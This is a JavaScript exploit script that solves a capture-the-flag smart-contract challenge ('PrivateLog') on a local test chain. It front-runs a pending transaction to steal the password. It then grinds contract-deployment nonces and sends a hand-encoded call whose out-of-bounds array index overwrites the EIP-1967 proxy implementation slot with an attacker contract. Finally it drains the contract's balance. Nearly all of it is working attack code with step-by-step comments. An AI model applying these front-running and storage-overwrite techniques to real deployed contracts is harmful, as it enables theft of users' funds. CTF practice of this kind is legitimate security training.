const ethers = require('ethers');
const path = require('path');
const fs = require('fs');
const fetch = require('node-fetch');

const HOST = "http://localhost:3000";
const ETH_HOST = "http://localhost:8545";

async function main() {

    const provider = ethers.getDefaultProvider(`${ETH_HOST}`);
    const details = await getChalDetails()
    

    console.log(await provider.getNetwork());
    console.log("Waiting for transaction in pending state to front run")
    provider.once("pending", async (tx) => {
        solvePrivateLog(tx, details);
    })
}

async function getChalDetails() {
    const details = await fetch(`${HOST}/challenge`);
    const data = await details.json();

    const privKey = data.player_wallet.private_key;
    const contractAddr = data.contract_address[1].address;

    return [privKey, contractAddr];
}

async function printFlag() {
    const details = await fetch(`${HOST}/challenge/solve`);
    const data = await details.json();

    const flag = data.flag;
    console.log(flag);
}


async function solvePrivateLog(frontruntx, details) {


    const privKey = details[0];
    const contractAddr = details[1];
    
    const provider = ethers.getDefaultProvider(`${ETH_HOST}`);
    const wallet = new ethers.Wallet(privKey, provider);


    // Connect To Contract
    const pathToContract = path.resolve(path.join(__dirname, './PrivateLog.json'));
    const abiData = JSON.parse(fs.readFileSync(pathToContract).toString()).abi;
    const tokenContract = new ethers.Contract(contractAddr, abiData, wallet);

    // Parse transaction data 
    const iface = new ethers.utils.Interface(abiData);
    const oldSecret = iface.parseTransaction(frontruntx).args.password;
    console.log("Secret is:", oldSecret)

    // Front Run
    const secret = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

    // Hashed password.
    const pwhash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(secret));

    console.log("Sending front run transaction with new hash");
    await (await tokenContract.createLogEntry("My log now", oldSecret, pwhash, {
        gasPrice: "1000000105",
        gasLimit: "100000"
    })).wait();



    let contractBal = await provider.getBalance(contractAddr)
    console.log("Initial contract balance", ethers.utils.formatEther(contractBal));

    // Hex representation of the password
    const secretHex = ethers.utils.hexlify(ethers.utils.toUtf8Bytes(secret));

    // Calculate EIP hash as defined in EIP1967
    let eiphash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("eip1967.proxy.implementation"))
    eiphash = ethers.BigNumber.from(eiphash).sub(1);
    console.log("EIP HASH:", eiphash.toHexString())

    // Load attack contract
    const pathToAttackContract = path.resolve(path.join(__dirname, './AttackPrivateLog.json'));
    const attackAbiData = fs.readFileSync(pathToAttackContract).toString();
    const attackFactory = ethers.ContractFactory.fromSolidity(attackAbiData, wallet);
    
    // Deploy lots of contracts until we hit one with an address that ends with 0x3E (62)
    // This is because the logs are stored as strings and the last byte stores the length
    // of the string * 2. 

    // This is because our attack string is 31 bytes long so it can fit into 1 slot. (Also enforced by the contract)
    
    console.log("Sending transactions until we find a contract deployment that ends in 0x3e...")
    let attackContract;
    let nonce = await wallet.getTransactionCount();
    while (true) {
        const nextContractAddr = ethers.utils.getContractAddress({
            from: wallet.address,
            nonce: nonce
        });

        if (nextContractAddr.slice(-2).toLowerCase() == "3e") {
            attackContract = await attackFactory.deploy();
            break;
        } else {
            // send null
            await wallet.sendTransaction({
                to: ethers.constants.AddressZero
            });
            nonce += 1;
        }
    }

    console.log("Attack contract is deployed at", attackContract.address);
   
   
    // We need to overwrite EIP slot by calculating the offset from the start of the data for logEntries.
    // Calculate required overflow to hit EIP storage slot.
    // logEntries is slot number 2, (slot 0 is Initializable vars, slot 1 is secretHash)
    // address = MAX_UINT256 - keccak256(2) + EIP_HASH 
    const maxint = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
    const address = ethers.BigNumber.from(ethers.utils.keccak256(ethers.utils.hexZeroPad(2, 32)))
    const logIndex = ethers.BigNumber.from(maxint).sub(address).add(eiphash).add(1).toHexString().slice(2);

    console.log("Calculates log index is", logIndex);


    // We want the value of the EIP slot to point to our own controlled contract address
    // Since the contract is going to store it as a string which is left aligned we need 
    // to pad it out with some zeros.

    // Then we remove the last byte to ensure it is 31 bytes and then the calulation of the length of the string
    // will finish our contract address (this is why it is required to end in 0x3e)
    // 
    const payload = ethers.utils.hexZeroPad(0, 12).slice(2) + attackContract.address.slice(2).slice(0, -2) + "00";

    // ABI Encoded data because libraries won't let us encode non UTF-8 bytes as strings.
    // Calling  updateLogEntry(uint256, string, string, bytes32)

    // FORMAT:
    /**
     * Header
     * bytes[0 - 3]: 0xdd1b54d3 -> function signature
     * 
     * Data
     * 0x00 = uint256 calculated address from above to hit EIP storage slot
     * 0x20 = Where to start reading for the "logEntry" string. In this case byte 0x80
     * 0x40 = Where to start reading for the  "password" string. In this case byte 0xc0
     * 0x60 = bytes32 newHash value
     * 0x80 = length of string to read for (logEntry) which is 0x1f as it is 31 bytes
     * 0xA0 = actual string value for logEntry
     * 0xC0 = length of string to read for (password) which is 0x1e as it is 30 bytes
     * 0xE0 = actual string value for password
     */

    const toSend = "0x{{function_selector}}{{address}}{{logEntry_start}}{{password_start}}{{pwhash}}{{payload_length}}{{payload}}{{secret_length}}{{secret}}";

    const formatted = toSend
        .replace("{{function_selector}}", "dd1b54d3")
        .replace("{{address}}", logIndex)
        .replace("{{logEntry_start}}", ethers.utils.hexZeroPad("0x80", 32).slice(2))
        .replace("{{password_start}}", ethers.utils.hexZeroPad("0xc0", 32).slice(2))
        .replace("{{pwhash}}", pwhash.slice(2))
        .replace("{{payload_length}}", ethers.utils.hexZeroPad("0x1f", 32).slice(2))
        .replace("{{payload}}", payload)
        .replace("{{secret_length}}", ethers.utils.hexZeroPad("0x1e", 32).slice(2))
        .replace("{{secret}}", secretHex.slice(2) + "0000")
        .toLowerCase();

    let eipvalue = await provider.getStorageAt(contractAddr, eiphash);
    console.log("EIP 1967 slot value before exploit: ", eipvalue)


    console.log("Sending exploit tx");
    const tx = {
        to: contractAddr,
        data: formatted,
    };

    await (await wallet.sendTransaction(tx)).wait();

    eipvalue = await provider.getStorageAt(contractAddr, eiphash);
    console.log("EIP 1967 slot value after exploit: ", eipvalue)

    console.log("Sending contract interaction to steal funds");
    await (await tokenContract.init(pwhash)).wait();

    await printFlag();
}

main()
